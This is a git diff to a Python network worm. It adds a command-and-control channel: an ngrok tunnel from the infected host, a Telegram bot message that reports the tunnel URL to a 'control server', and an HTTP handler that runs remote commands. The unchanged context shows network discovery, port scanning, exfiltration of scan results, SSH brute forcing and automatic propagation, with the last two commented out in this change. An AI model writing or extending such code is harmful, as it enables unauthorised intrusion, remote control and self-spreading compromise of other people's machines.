@@ -7,7 +7,11 @@ import netifaces
 import ipcalc
 import netaddr
 import sys
+import subprocess
 from scapy.all import *
+from pyngrok import ngrok
+from http.server import BaseHTTPRequestHandler, HTTPServer
+
 
 import time as t
 
@@ -156,14 +160,88 @@ def determine_if():
 	
 	if not online_interfaces: return 0
 	else: return online_interfaces[0]
+	
+"""
+HTTP SERVER FUNCTIONALITIES
+"""
+def ls():
+	process = subprocess.run("ls",stdout=subprocess.PIPE,stderr=subprocess.PIPE,text=True)
+	return process.stdout
+	
+def delete():
+	# TODO: KILL python process and delete all worm files
+	return "deleted"
+	
+def execute_command(command):
+	if command == "ls":
+		return ls()
+	elif command == "delete":
+		return delete()
+
+class my_http_request_handler(BaseHTTPRequestHandler):
+
+	def do_POST(self):
+		"""
+		READ POST REQUEST
+		"""
+		content_length = int(self.headers["Content-Length"])
+		post_data = self.rfile.read(content_length)
+		
+		
+		allowed_commands = ["ls","delete"]
+		command = post_data.decode("utf-8")
+		
+		if command in allowed_commands:
+			output = execute_command(command)
+			"""
+			RESPONSE HEADERS
+			"""
+			self.send_response(200)
+			self.send_header("Content-type","text/html")
+			self.end_headers()
+			
+			"""
+			RESPONSE DATA
+			"""
+			self.wfile.write(output.encode("utf-8"))
+		else:
+			self.send_response(400)
+			self.send_header("Content-type","text/html")
+			self.end_headers()
+			self.wfile.write(b"COMMAND DOES NOT EXISTS")
+		
+
+def run_server(host,port,tel_token,chat_id):
+	http_tunnel = ngrok.connect(port)	
+	print("opening http tunnel at: " + http_tunnel.public_url)
+	
+	"""
+	COMMUNICATING TUNNEL URL TO CONTROL SERVER
+	"""
+	post_req = requests.post("https://api.telegram.org/bot"+tel_token+"/sendMessage", \
+				      data={"chat_id":chat_id,"text":"tunnel: "+http_tunnel.public_url})
+		
+	"""
+	STARTING WEB SERVER
+	"""
+	webserver = HTTPServer((host,port),my_http_request_handler)
+	
+	try:
+		webserver.serve_forever()
+	except KeyboardInterrupt:
+		pass
+	
+	webserver.server_close()
 
 if __name__ == "__main__":
 	
 	### CHECK IF ONLINE ###
+	print("checking if host is online...")
 	interface = determine_if()
 	if interface == 0 : sys.exit("Not online")
 
 	### NETWORK DISCOVERY ###
+	print("discovering network...")
 	info = netifaces.ifaddresses(interface)[netifaces.AF_INET]
 	host_ip = info[0]['addr']
 	netmask = info[0]['netmask']
@@ -175,6 +253,7 @@ if __name__ == "__main__":
 	network = discover_network(subnet)
 	
 	### PORT SCAN OF EACH DEVICE ON THE NETWORK ###
+	print("scanning each device's ports on the network...")
 	devices_open_ports = port_scan(network)
 	
 	### CONFIG ###
@@ -183,9 +262,16 @@ if __name__ == "__main__":
 	con_file.close()
 
 	### SENDING THE INFORMATION TO THE CONTROL SERVER ###
+	print("sending feedback to control server...")
 	ret_status = send_feedback(config["http_token"],config["chat_id"],host_ip,netmask,broadcast,gateway,devices_open_ports)
+	
+	### TODO : MODIFY BEHAVIOR
 	if ret_status == 0 : sys.exit("no device with wkp open, nothing to do here")
 	
+	print("starting http server. Waiting for commands...")
+	run_server("localhost",2525,config["http_token"],config["chat_id"])
+	
+	"""
 	### SSH BRUTE FORCE ###
 	ssh_targets = [elem[0] for elem in devices_open_ports if 22 in elem[1]]
 	if not ssh_targets: sys.exit("no device with ssh active, not possibile to spread")
@@ -197,4 +283,5 @@ if __name__ == "__main__":
 	### AUTO PROPAGATION ###
 	for target in credentials:
 		if isinstance(target,list):
-			propagate(target[0],target[1],target[2],target[3])
+			propagate(target[0],target[1],target[2],target[3])		
+	"""
